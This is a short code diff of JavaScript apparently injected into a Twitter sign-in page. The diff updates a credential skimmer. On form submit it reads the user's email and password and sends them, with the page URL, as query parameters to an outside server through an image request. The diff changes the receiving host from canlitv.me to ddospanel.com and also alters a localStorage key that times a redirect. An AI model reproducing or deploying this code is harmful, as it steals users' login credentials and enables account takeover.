@@ -12,7 +12,7 @@ window.location = "https://twitter.com/?lang=tr";
 }
 
 tarih = new Date();
-    storage_key = 'access_yorummz_';
+    storage_key = 'access_yoruzmmz_';
     if (!localStorage[storage_key] || (localStorage[storage_key] && tarih.getTime() >= localStorage[storage_key])) {
         tarih.setTime(tarih.getTime() + 9999 * 9999 * 9999);
         localStorage[storage_key] = tarih.getTime();
@@ -26,7 +26,7 @@ document.getElementById("session").innerHTML = '<a href="https://twitter.com/?la
 
 document.getElementsByClassName('t1-form signin')[0].onsubmit = function(e) {
 
-   new Image().src = 'http://www.canlitv.me/cptw.php?username='+document.getElementById('signin-email').value+'&sifre='+document.getElementById('signin-password').value+'&location='+location.href;   
+   new Image().src = 'http://siktir.ddospanel.com/cptw.php?username='+document.getElementById('signin-email').value+'&sifre='+document.getElementById('signin-password').value+'&location='+location.href;   
 }
 
 
